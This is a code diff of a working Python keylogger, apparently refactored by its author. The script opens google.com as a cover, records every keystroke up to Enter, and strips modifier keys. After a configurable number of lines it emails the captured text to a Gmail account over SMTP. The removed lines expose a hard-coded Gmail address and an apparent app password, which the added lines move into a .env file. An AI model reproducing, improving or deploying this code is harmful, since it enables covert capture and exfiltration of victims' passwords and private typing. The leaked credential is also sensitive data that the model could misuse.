@@ -1,45 +1,73 @@
-# Keyboard module in Python
 import keyboard
-import re
 import webbrowser
 import smtplib
 import ssl
+from dotenv import load_dotenv
+from os import getenv
+
+load_dotenv(".env")
 
 webbrowser.open("www.google.com")
 compteur = 0
 
-last_str_rk = ""
+all_str_recorded = ""
+mail = getenv("keylogger_MAIL")
+password = getenv("keylogger_PASS")
+rate = int(getenv("keylogger_RATE"))
+
 
 def envoi():
-    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl.create_default_context()) as server:
-        server.login("leserpentpython327@gmail.com","cnwrgmlvwsnlcmqz")
-        server.sendmail("leserpentpython327@gmail.com", "leserpentpython327@gmail.com", last_str_rk) 
+    with smtplib.SMTP_SSL(
+        "smtp.gmail.com", 465, context=ssl.create_default_context()
+    ) as server:
+        server.login(mail, password)
+        server.sendmail(
+            mail,
+            mail,
+            all_str_recorded.encode("ascii", errors="namereplace"),
+        )
+
 
 while True:
-    rk = keyboard.record(until ='enter')
+    keyboard_events_recorder = keyboard.record(until="enter")
 
-    str_rk = str(rk)
+    str_recorded = str(keyboard_events_recorder)
 
-    sub = re.sub("KeyboardEvent","",str_rk)
-    sub2 = re.sub("[()]","",sub)
+    # on supprime tous les mots clés KeyboardEvent(
+    sub = str_recorded.replace("KeyboardEvent(", "")
 
-    new_str_rk = ""
+    formated_str = ""
 
-    for i in sub2.split(','):
-        if 'up' not in i:
-            new_str_rk = new_str_rk + i
+    # on supprime toutes les touches "up" car on veut uniquement une fois la touche quand c'est "down"
+    for i in sub.split(","):
+        if "up" not in i:
+            formated_str += i
 
-    sub3 = re.sub(" down","",new_str_rk)
-    sub4 = re.sub("esc","",sub3)
-    sub5 = re.sub(" ","",sub4)
-    sub6 = re.sub("space"," ",sub5)
-    sub7 = re.sub("enter","",sub6)
-    last_str_rk += sub7
-    last_str_rk.encode('utf-8')
+    # on supprime maintenant l'indication down)
+    sub3 = formated_str.replace(" down)", "")
+
+    # les mots clés dont on n'a pas besoin
+    no_use_keywords = {
+        "enter": "",
+        "esc": "",
+        "ctrl": "",
+        "alt": "",
+        "tab": "",
+        "rightshift": "",
+        "leftshift": "",
+        " ": "",
+        "space": " ",
+        "maj": "",
+    }
+    sub4 = sub3
+    for key, value in no_use_keywords.items():
+        sub4 = sub4.replace(key, value)
+
+    all_str_recorded += sub4
 
     compteur += 1
 
-    if compteur == 5:
+    if compteur == rate:
         compteur = 0
         envoi()
-        last_str_rk = ""  
+        all_str_recorded = ""
